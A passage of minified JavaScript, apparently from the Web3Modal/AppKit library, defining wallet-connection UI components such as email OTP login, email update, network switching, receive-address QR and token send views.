    `}};Kq=aBe([me("w3m-what-is-a-network-view")],Kq);var lBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const uBe=[{images:["login","profile","lock"],title:"One login for all of web3",text:"Log in to any app by connecting your wallet. Say goodbye to countless passwords!"},{images:["defi","nft","eth"],title:"A home for your digital assets",text:"A wallet lets you store, send and receive digital assets like cryptocurrencies and NFTs."},{images:["browser","noun","dao"],title:"Your gateway to a new web",text:"With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more."}];let Gq=class extends he{render(){return F`
      <wui-flex
        flexDirection="column"
        .padding=${["xxl","xl","xl","xl"]}
        alignItems="center"
        gap="xl"
      >
        <w3m-help-widget .data=${uBe}></w3m-help-widget>
        <wui-button variant="main" size="md" @click=${this.onGetWallet.bind(this)}>
          <wui-icon color="inherit" slot="iconLeft" name="wallet"></wui-icon>
          Get a wallet
        </wui-button>
      </wui-flex>
    `}onGetWallet(){Ve.sendEvent({type:"track",event:"CLICK_GET_WALLET"}),Ee.push("GetWallet")}};Gq=lBe([me("w3m-what-is-a-wallet-view")],Gq);var dBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Zq=class extends he{render(){return F`
      <wui-flex
        flexDirection="column"
        .padding=${["xxl","3xl","xl","3xl"]}
        alignItems="center"
        gap="xl"
      >
        <wui-visual name="onrampCard"></wui-visual>
        <wui-flex flexDirection="column" gap="xs" alignItems="center">
          <wui-text align="center" variant="paragraph-500" color="fg-100">
            Quickly and easily buy digital assets!
          </wui-text>
          <wui-text align="center" variant="small-400" color="fg-200">
            Simply select your preferred onramp provider and add digital assets to your account
            using your credit card or bank transfer
          </wui-text>
        </wui-flex>
        <wui-button @click=${Ee.goBack}>
          <wui-icon size="sm" color="inherit" name="add" slot="iconLeft"></wui-icon>
          Buy
        </wui-button>
      </wui-flex>
    `}};Zq=dBe([me("w3m-what-is-a-buy-view")],Zq);const hBe=ge`
  wui-loading-spinner {
    margin: 9px auto;
  }

  .email-display,
  .email-display wui-text {
    max-width: 100%;
  }
`;var OC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const fBe=6;let w0=class extends he{firstUpdated(){this.startOTPTimeout()}disconnectedCallback(){clearTimeout(this.OTPTimeout)}constructor(){super(),this.loading=!1,this.timeoutTimeLeft=Ro.getTimeToNextEmailLogin(),this.error="",this.otp="",this.email=Ee.state.data?.email,this.authConnector=Xe.getAuthConnector()}render(){if(!this.email)throw new Error("w3m-email-otp-widget: No email provided");const e=!!this.timeoutTimeLeft,t=this.getFooterLabels(e);return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["l","0","l","0"]}
        gap="l"
      >
        <wui-flex
          class="email-display"
          flexDirection="column"
          alignItems="center"
          .padding=${["0","xl","0","xl"]}
        >
          <wui-text variant="paragraph-400" color="fg-100" align="center">
            Enter the code we sent to
          </wui-text>
          <wui-text variant="paragraph-500" color="fg-100" lineClamp="1" align="center">
            ${this.email}
          </wui-text>
        </wui-flex>

        <wui-text variant="small-400" color="fg-200">The code expires in 20 minutes</wui-text>

        ${this.loading?F`<wui-loading-spinner size="xl" color="accent-100"></wui-loading-spinner>`:F` <wui-flex flexDirection="column" alignItems="center" gap="xs">
              <wui-otp
                dissabled
                length="6"
                @inputChange=${this.onOtpInputChange.bind(this)}
                .otp=${this.otp}
              ></wui-otp>
              ${this.error?F`
                    <wui-text variant="small-400" align="center" color="error-100">
                      ${this.error}. Try Again
                    </wui-text>
                  `:null}
            </wui-flex>`}

        <wui-flex alignItems="center" gap="xs">
          <wui-text variant="small-400" color="fg-200">${t.title}</wui-text>
          <wui-link @click=${this.onResendCode.bind(this)} .disabled=${e}>
            ${t.action}
          </wui-link>
        </wui-flex>
      </wui-flex>
    `}startOTPTimeout(){this.timeoutTimeLeft=Ro.getTimeToNextEmailLogin(),this.OTPTimeout=setInterval(()=>{this.timeoutTimeLeft>0?this.timeoutTimeLeft=Ro.getTimeToNextEmailLogin():clearInterval(this.OTPTimeout)},1e3)}async onOtpInputChange(e){try{this.loading||(this.otp=e.detail,this.authConnector&&this.otp.length===fBe&&(this.loading=!0,await this.onOtpSubmit?.(this.otp)))}catch(t){this.error=ke.parseError(t),this.loading=!1}}async onResendCode(){try{if(this.onOtpResend){if(!this.loading&&!this.timeoutTimeLeft){if(this.error="",this.otp="",!Xe.getAuthConnector()||!this.email)throw new Error("w3m-email-otp-widget: Unable to resend email");this.loading=!0,await this.onOtpResend(this.email),this.startOTPTimeout(),vt.showSuccess("Code email resent")}}else this.onStartOver&&this.onStartOver()}catch(e){vt.showError(e)}finally{this.loading=!1}}getFooterLabels(e){return this.onStartOver?{title:"Something wrong?",action:`Try again ${e?`in ${this.timeoutTimeLeft}s`:""}`}:{title:"Didn't receive it?",action:`Resend ${e?`in ${this.timeoutTimeLeft}s`:"Code"}`}}};w0.styles=hBe;OC([te()],w0.prototype,"loading",void 0);OC([te()],w0.prototype,"timeoutTimeLeft",void 0);OC([te()],w0.prototype,"error",void 0);w0=OC([me("w3m-email-otp-widget")],w0);var pBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Yq=class extends w0{constructor(){super(...arguments),this.onOtpSubmit=async e=>{try{if(this.authConnector){if(await this.authConnector.provider.connectOtp({otp:e}),Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_PASS"}),re.state.activeChain)await ft.connectExternal(this.authConnector,re.state.activeChain);else throw new Error("Active chain is not set on ChainControll");Ve.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"email",name:this.authConnector.name||"Unknown"}}),Ne.state.siwx||Ut.close()}}catch(t){throw Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_FAIL",properties:{message:ke.parseError(t)}}),t}},this.onOtpResend=async e=>{this.authConnector&&(await this.authConnector.provider.connectEmail({email:e}),Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_SENT"}))}}};Yq=pBe([me("w3m-email-verify-otp-view")],Yq);const gBe=ge`
  wui-icon-box {
    height: var(--wui-icon-box-size-xl);
    width: var(--wui-icon-box-size-xl);
  }
`;var Hee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let A7=class extends he{constructor(){super(),this.email=Ee.state.data?.email,this.authConnector=Xe.getAuthConnector(),this.loading=!1,this.listenForDeviceApproval()}render(){if(!this.email)throw new Error("w3m-email-verify-device-view: No email provided");if(!this.authConnector)throw new Error("w3m-email-verify-device-view: No auth connector provided");return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["xxl","s","xxl","s"]}
        gap="l"
      >
        <wui-icon-box
          size="xl"
          iconcolor="accent-100"
          backgroundcolor="accent-100"
          icon="verify"
          background="opaque"
        ></wui-icon-box>

        <wui-flex flexDirection="column" alignItems="center" gap="s">
          <wui-flex flexDirection="column" alignItems="center">
            <wui-text variant="paragraph-400" color="fg-100">
              Approve the login link we sent to
            </wui-text>
            <wui-text variant="paragraph-400" color="fg-100"><b>${this.email}</b></wui-text>
          </wui-flex>

          <wui-text variant="small-400" color="fg-200" align="center">
            The code expires in 20 minutes
          </wui-text>

          <wui-flex alignItems="center" id="w3m-resend-section" gap="xs">
            <wui-text variant="small-400" color="fg-100" align="center">
              Didn't receive it?
            </wui-text>
            <wui-link @click=${this.onResendCode.bind(this)} .disabled=${this.loading}>
              Resend email
            </wui-link>
          </wui-flex>
        </wui-flex>
      </wui-flex>
    `}async listenForDeviceApproval(){if(this.authConnector)try{await this.authConnector.provider.connectDevice(),Ve.sendEvent({type:"track",event:"DEVICE_REGISTERED_FOR_EMAIL"}),Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_SENT"}),Ee.replace("EmailVerifyOtp",{email:this.email})}catch{Ee.goBack()}}async onResendCode(){try{if(!this.loading){if(!this.authConnector||!this.email)throw new Error("w3m-email-login-widget: Unable to resend email");this.loading=!0,await this.authConnector.provider.connectEmail({email:this.email}),this.listenForDeviceApproval(),vt.showSuccess("Code email resent")}}catch(e){vt.showError(e)}finally{this.loading=!1}}};A7.styles=gBe;Hee([te()],A7.prototype,"loading",void 0);A7=Hee([me("w3m-email-verify-device-view")],A7);const mBe=ge`
  div {
    width: 100%;
  }

  [data-ready='false'] {
    transform: scale(1.05);
  }

  @media (max-width: 430px) {
    [data-ready='false'] {
      transform: translateY(-50px);
    }
  }
`;var Vee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const BA=600,Jq=360,wBe=64;let I7=class extends he{constructor(){super(),this.bodyObserver=void 0,this.unsubscribe=[],this.iframe=document.getElementById("w3m-iframe"),this.ready=!1,this.unsubscribe.push(Ut.subscribeKey("open",e=>{e||(this.onHideIframe(),Ee.popTransactionStack())}),Ut.subscribeKey("shake",e=>{e?this.iframe.style.animation="w3m-shake 500ms var(--wui-ease-out-power-2)":this.iframe.style.animation="none"}))}disconnectedCallback(){this.onHideIframe(),this.unsubscribe.forEach(e=>e()),this.bodyObserver?.unobserve(window.document.body)}async firstUpdated(){await this.syncTheme(),this.iframe.style.display="block";const e=this?.renderRoot?.querySelector("div");this.bodyObserver=new ResizeObserver(t=>{const n=t?.[0]?.contentBoxSize?.[0]?.inlineSize;this.iframe.style.height=`${BA}px`,e.style.height=`${BA}px`,n&&n<=430?(this.iframe.style.width="100%",this.iframe.style.left="0px",this.iframe.style.bottom="0px",this.iframe.style.top="unset"):(this.iframe.style.width=`${Jq}px`,this.iframe.style.left=`calc(50% - ${Jq/2}px)`,this.iframe.style.top=`calc(50% - ${BA/2}px + ${wBe/2}px)`,this.iframe.style.bottom="unset"),this.ready=!0,this.onShowIframe()}),this.bodyObserver.observe(window.document.body)}render(){return F`<div data-ready=${this.ready} id="w3m-frame-container"></div>`}onShowIframe(){const e=window.innerWidth<=430;this.iframe.style.animation=e?"w3m-iframe-zoom-in-mobile 200ms var(--wui-ease-out-power-2)":"w3m-iframe-zoom-in 200ms var(--wui-ease-out-power-2)"}onHideIframe(){this.iframe.style.display="none",this.iframe.style.animation="w3m-iframe-fade-out 200ms var(--wui-ease-out-power-2)"}async syncTheme(){const e=Xe.getAuthConnector();if(e){const t=Mi.getSnapshot().themeMode,i=Mi.getSnapshot().themeVariables;await e.provider.syncTheme({themeVariables:i,w3mThemeVariables:gd(i,t)})}}};I7.styles=mBe;Vee([te()],I7.prototype,"ready",void 0);I7=Vee([me("w3m-approve-transaction-view")],I7);var bBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Qq=class extends he{render(){return F`
      <wui-flex flexDirection="column" alignItems="center" gap="xl" padding="xl">
        <wui-text variant="paragraph-400" color="fg-100">Follow the instructions on</wui-text>
        <wui-chip
          icon="externalLink"
          variant="fill"
          href=${kr.SECURE_SITE_DASHBOARD}
          imageSrc=${kr.SECURE_SITE_FAVICON}
          data-testid="w3m-secure-website-button"
        >
        </wui-chip>
        <wui-text variant="small-400" color="fg-200">
          You will have to reconnect for security reasons
        </wui-text>
      </wui-flex>
    `}};Qq=bBe([me("w3m-upgrade-wallet-view")],Qq);const vBe=ge`
  wui-email-input {
    width: 100%;
  }

  form {
    width: 100%;
    display: block;
    position: relative;
  }
`;var QR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let dy=class extends he{constructor(){super(...arguments),this.formRef=gc(),this.initialEmail=Ee.state.data?.email??"",this.email="",this.loading=!1}firstUpdated(){this.formRef.value?.addEventListener("keydown",e=>{e.key==="Enter"&&this.onSubmitEmail(e)})}render(){const e=!this.loading&&this.email.length>3&&this.email!==this.initialEmail;return F`
      <wui-flex flexDirection="column" padding="m" gap="m">
        <form ${mc(this.formRef)} @submit=${this.onSubmitEmail.bind(this)}>
          <wui-email-input
            value=${this.initialEmail}
            .disabled=${this.loading}
            @inputChange=${this.onEmailInputChange.bind(this)}
          >
          </wui-email-input>
          <input type="submit" hidden />
        </form>

        <wui-flex gap="s">
          <wui-button size="md" variant="neutral" fullWidth @click=${Ee.goBack}>
            Cancel
          </wui-button>

          <wui-button
            size="md"
            variant="main"
            fullWidth
            @click=${this.onSubmitEmail.bind(this)}
            .disabled=${!e}
            .loading=${this.loading}
          >
            Save
          </wui-button>
        </wui-flex>
      </wui-flex>
    `}onEmailInputChange(e){this.email=e.detail}async onSubmitEmail(e){try{if(this.loading)return;this.loading=!0,e.preventDefault();const t=Xe.getAuthConnector();if(!t)throw new Error("w3m-update-email-wallet: Auth connector not found");const i=await t.provider.updateEmail({email:this.email});Ve.sendEvent({type:"track",event:"EMAIL_EDIT"}),i.action==="VERIFY_SECONDARY_OTP"?Ee.push("UpdateEmailSecondaryOtp",{email:this.initialEmail,newEmail:this.email}):Ee.push("UpdateEmailPrimaryOtp",{email:this.initialEmail,newEmail:this.email})}catch(t){vt.showError(t),this.loading=!1}}};dy.styles=vBe;QR([te()],dy.prototype,"email",void 0);QR([te()],dy.prototype,"loading",void 0);dy=QR([me("w3m-update-email-wallet-view")],dy);var yBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Xq=class extends w0{constructor(){super(),this.email=Ee.state.data?.email,this.onOtpSubmit=async e=>{try{this.authConnector&&(await this.authConnector.provider.updateEmailPrimaryOtp({otp:e}),Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_PASS"}),Ee.replace("UpdateEmailSecondaryOtp",Ee.state.data))}catch(t){throw Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_FAIL",properties:{message:ke.parseError(t)}}),t}},this.onStartOver=()=>{Ee.replace("UpdateEmailWallet",Ee.state.data)}}};Xq=yBe([me("w3m-update-email-primary-otp-view")],Xq);var xBe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ez=class extends w0{constructor(){super(),this.email=Ee.state.data?.newEmail,this.onOtpSubmit=async e=>{try{this.authConnector&&(await this.authConnector.provider.updateEmailSecondaryOtp({otp:e}),Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_PASS"}),Ee.reset("Account"))}catch(t){throw Ve.sendEvent({type:"track",event:"EMAIL_VERIFICATION_CODE_FAIL",properties:{message:ke.parseError(t)}}),t}},this.onStartOver=()=>{Ee.replace("UpdateEmailWallet",Ee.state.data)}}};ez=xBe([me("w3m-update-email-secondary-otp-view")],ez);const CBe=ge`
  :host > wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
  }

  :host > wui-flex::-webkit-scrollbar {
    display: none;
  }
`;var Kee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let T7=class extends he{constructor(){super(),this.swapUnsupportedChain=Ee.state.data?.swapUnsupportedChain,this.unsubscribe=[],this.disconecting=!1,this.unsubscribe.push(Li.subscribeNetworkImages(()=>this.requestUpdate()))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      <wui-flex class="container" flexDirection="column" gap="0">
        <wui-flex
          class="container"
          flexDirection="column"
          .padding=${["m","xl","xs","xl"]}
          alignItems="center"
          gap="xl"
        >
          ${this.descriptionTemplate()}
        </wui-flex>

        <wui-flex flexDirection="column" padding="s" gap="xs">
          ${this.networksTemplate()}
        </wui-flex>

        <wui-separator text="or"></wui-separator>
        <wui-flex flexDirection="column" padding="s" gap="xs">
          <wui-list-item
            variant="icon"
            iconVariant="overlay"
            icon="disconnect"
            ?chevron=${!1}
            .loading=${this.disconecting}
            @click=${this.onDisconnect.bind(this)}
            data-testid="disconnect-button"
          >
            <wui-text variant="paragraph-500" color="fg-200">Disconnect</wui-text>
          </wui-list-item>
        </wui-flex>
      </wui-flex>
    `}descriptionTemplate(){return this.swapUnsupportedChain?F`
        <wui-text variant="small-400" color="fg-200" align="center">
          The swap feature doesnt support your current network. Switch to an available option to
          continue.
        </wui-text>
      `:F`
      <wui-text variant="small-400" color="fg-200" align="center">
        This app doesnt support your current network. Switch to an available option to continue.
      </wui-text>
    `}networksTemplate(){const e=re.getAllRequestedCaipNetworks(),t=re.getAllApprovedCaipNetworkIds(),i=ke.sortRequestedNetworks(t,e);return(this.swapUnsupportedChain?i.filter(s=>kr.SWAP_SUPPORTED_NETWORKS.includes(s.caipNetworkId)):i).map(s=>F`
        <wui-list-network
          imageSrc=${ye(Nr.getNetworkImage(s))}
          name=${s.name??"Unknown"}
          @click=${()=>this.onSwitchNetwork(s)}
        >
        </wui-list-network>
      `)}async onDisconnect(){try{this.disconecting=!0,await ft.disconnect(),Ve.sendEvent({type:"track",event:"DISCONNECT_SUCCESS"}),Ut.close()}catch{Ve.sendEvent({type:"track",event:"DISCONNECT_ERROR"}),vt.showError("Failed to disconnect")}finally{this.disconecting=!1}}async onSwitchNetwork(e){const t=Se.state.caipAddress,i=re.getAllApprovedCaipNetworkIds(),n=re.getNetworkProp("supportsAllNetworks",e.chainNamespace),s=Ee.state.data;t?i?.includes(e.caipNetworkId)?await re.switchActiveNetwork(e):n?Ee.push("SwitchNetwork",{...s,network:e}):Ee.push("SwitchNetwork",{...s,network:e}):t||(re.setActiveCaipNetwork(e),Ee.push("Connect"))}};T7.styles=CBe;Kee([te()],T7.prototype,"disconecting",void 0);T7=Kee([me("w3m-unsupported-chain-view")],T7);const EBe=ge`
  wui-compatible-network {
    margin-top: var(--wui-spacing-l);
  }
`;var $4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let bg=class extends he{constructor(){super(),this.unsubscribe=[],this.address=Se.state.address,this.profileName=Se.state.profileName,this.network=re.state.activeCaipNetwork,this.preferredAccountType=Se.state.preferredAccountType,this.unsubscribe.push(Se.subscribe(e=>{e.address?(this.address=e.address,this.profileName=e.profileName,this.preferredAccountType=e.preferredAccountType):vt.showError("Account not found")}),re.subscribeKey("activeCaipNetwork",e=>{e?.id&&(this.network=e)}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(!this.address)throw new Error("w3m-wallet-receive-view: No account provided");const e=Nr.getNetworkImage(this.network);return F` <wui-flex
      flexDirection="column"
      .padding=${["0","l","l","l"]}
      alignItems="center"
    >
      <wui-chip-button
        data-testid="receive-address-copy-button"
        @click=${this.onCopyClick.bind(this)}
        text=${Wt.getTruncateString({string:this.profileName||this.address||"",charsStart:this.profileName?18:4,charsEnd:this.profileName?0:4,truncate:this.profileName?"end":"middle"})}
        icon="copy"
        size="sm"
        imageSrc=${e||""}
        variant="gray"
      ></wui-chip-button>
      <wui-flex
        flexDirection="column"
        .padding=${["l","0","0","0"]}
        alignItems="center"
        gap="s"
      >
        <wui-qr-code
          size=${232}
          theme=${Mi.state.themeMode}
          uri=${this.address}
          ?arenaClear=${!0}
          color=${ye(Mi.state.themeVariables["--w3m-qr-color"])}
          data-testid="wui-qr-code"
        ></wui-qr-code>
        <wui-text variant="paragraph-500" color="fg-100" align="center">
          Copy your address or scan this QR code
        </wui-text>
      </wui-flex>
      ${this.networkTemplate()}
    </wui-flex>`}networkTemplate(){const e=re.getAllRequestedCaipNetworks(),t=re.checkIfSmartAccountEnabled(),i=re.state.activeCaipNetwork;if(this.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT&&t)return i?F`<wui-compatible-network
        @click=${this.onReceiveClick.bind(this)}
        text="Only receive assets on this network"
        .networkImages=${[Nr.getNetworkImage(i)??""]}
      ></wui-compatible-network>`:null;const s=(e?.filter(o=>o?.assets?.imageId)?.slice(0,5)).map(Nr.getNetworkImage).filter(Boolean);return F`<wui-compatible-network
      @click=${this.onReceiveClick.bind(this)}
      text="Only receive assets on these networks"
      .networkImages=${s}
    ></wui-compatible-network>`}onReceiveClick(){Ee.push("WalletCompatibleNetworks")}onCopyClick(){try{this.address&&(ke.copyToClopboard(this.address),vt.showSuccess("Address copied"))}catch{vt.showError("Failed to copy")}}};bg.styles=EBe;$4([te()],bg.prototype,"address",void 0);$4([te()],bg.prototype,"profileName",void 0);$4([te()],bg.prototype,"network",void 0);$4([te()],bg.prototype,"preferredAccountType",void 0);bg=$4([me("w3m-wallet-receive-view")],bg);const _Be=ge`
  :host > wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
  }

  :host > wui-flex::-webkit-scrollbar {
    display: none;
  }
`;var Gee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let k7=class extends he{constructor(){super(),this.unsubscribe=[],this.preferredAccountType=Se.state.preferredAccountType,this.unsubscribe.push(Se.subscribeKey("preferredAccountType",e=>{this.preferredAccountType=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F` <wui-flex
      flexDirection="column"
      .padding=${["xs","s","m","s"]}
      gap="xs"
    >
      <wui-banner
        icon="warningCircle"
        text="You can only receive assets on these networks"
      ></wui-banner>
      ${this.networkTemplate()}
    </wui-flex>`}networkTemplate(){const e=re.getAllRequestedCaipNetworks(),t=re.getAllApprovedCaipNetworkIds(),i=re.state.activeCaipNetwork,n=re.checkIfSmartAccountEnabled();let s=ke.sortRequestedNetworks(t,e);if(n&&this.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT){if(!i)return null;s=[i]}return s.map(o=>F`
        <wui-list-network
          imageSrc=${ye(Nr.getNetworkImage(o))}
          name=${o.name??"Unknown"}
          ?transparent=${!0}
        >
        </wui-list-network>
      `)}};k7.styles=_Be;Gee([te()],k7.prototype,"preferredAccountType",void 0);k7=Gee([me("w3m-wallet-compatible-networks-view")],k7);const SBe=ge`
  :host {
    display: block;
  }

  wui-flex {
    position: relative;
  }

  wui-icon-box {
    width: 40px;
    height: 40px;
    border-radius: var(--wui-border-radius-xs) !important;
    border: 5px solid var(--wui-color-bg-125);
    background: var(--wui-color-bg-175);
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 3;
  }

  wui-button {
    --local-border-radius: var(--wui-border-radius-xs) !important;
  }

  .inputContainer {
    height: fit-content;
  }
`;var D0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Cu=class extends he{constructor(){super(),this.unsubscribe=[],this.token=Dr.state.token,this.sendTokenAmount=Dr.state.sendTokenAmount,this.receiverAddress=Dr.state.receiverAddress,this.receiverProfileName=Dr.state.receiverProfileName,this.loading=Dr.state.loading,this.gasPriceInUSD=Dr.state.gasPriceInUSD,this.gasPrice=Dr.state.gasPrice,this.message="Preview Send",this.fetchNetworkPrice(),this.fetchBalances(),this.unsubscribe.push(Dr.subscribe(e=>{this.token=e.token,this.sendTokenAmount=e.sendTokenAmount,this.receiverAddress=e.receiverAddress,this.gasPriceInUSD=e.gasPriceInUSD,this.receiverProfileName=e.receiverProfileName,this.loading=e.loading}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return this.getMessage(),F` <wui-flex flexDirection="column" .padding=${["0","l","l","l"]}>
      <wui-flex class="inputContainer" gap="xs" flexDirection="column">
        <w3m-input-token
          .token=${this.token}
          .sendTokenAmount=${this.sendTokenAmount}
          .gasPriceInUSD=${this.gasPriceInUSD}
          .gasPrice=${this.gasPrice}
        ></w3m-input-token>
        <wui-icon-box
          size="inherit"
          backgroundColor="fg-300"
          iconSize="lg"
          iconColor="fg-250"
          background="opaque"
          icon="arrowBottom"
        ></wui-icon-box>
        <w3m-input-address
          .value=${this.receiverProfileName?this.receiverProfileName:this.receiverAddress}
        ></w3m-input-address>
      </wui-flex>
      <wui-flex .margin=${["l","0","0","0"]}>
        <wui-button
          @click=${this.onButtonClick.bind(this)}
          ?disabled=${!this.message.startsWith("Preview Send")}
          size="lg"
          variant="main"
          ?loading=${this.loading}
          fullWidth
        >
          ${this.message}
        </wui-button>
      </wui-flex>
    </wui-flex>`}async fetchBalances(){await Dr.fetchTokenBalance(),Dr.fetchNetworkBalance()}async fetchNetworkPrice(){await dt.getNetworkTokenPrice();const e=await dt.getInitialGasPrice();e?.gasPrice&&e?.gasPriceInUSD&&(Dr.setGasPrice(e.gasPrice),Dr.setGasPriceInUsd(e.gasPriceInUSD))}onButtonClick(){Ee.push("WalletSendPreview")}getMessage(){this.message="Preview Send",this.receiverAddress&&!ke.isAddress(this.receiverAddress,re.state.activeChain)&&(this.message="Invalid Address"),this.receiverAddress||(this.message="Add Address"),Dr.hasInsufficientGasFunds()&&(this.message="Insufficient Gas Funds"),this.sendTokenAmount&&this.token&&this.sendTokenAmount>Number(this.token.quantity.numeric)&&(this.message="Insufficient Funds"),this.sendTokenAmount||(this.message="Add Amount"),this.sendTokenAmount&&this.token?.price&&(this.sendTokenAmount*this.token.price||(this.message="Incorrect Value")),this.token||(this.message="Select Token")}};Cu.styles=SBe;D0([te()],Cu.prototype,"token",void 0);D0([te()],Cu.prototype,"sendTokenAmount",void 0);D0([te()],Cu.prototype,"receiverAddress",void 0);D0([te()],Cu.prototype,"receiverProfileName",void 0);D0([te()],Cu.prototype,"loading",void 0);D0([te()],Cu.prototype,"gasPriceInUSD",void 0);D0([te()],Cu.prototype,"gasPrice",void 0);D0([te()],Cu.prototype,"message",void 0);Cu=D0([me("w3m-wallet-send-view")],Cu);const ABe=ge`
  .contentContainer {
    height: 440px;
    overflow: scroll;
    scrollbar-width: none;
  }

  .contentContainer::-webkit-scrollbar {
    display: none;
  }

  wui-icon-box {
    width: 40px;
    height: 40px;
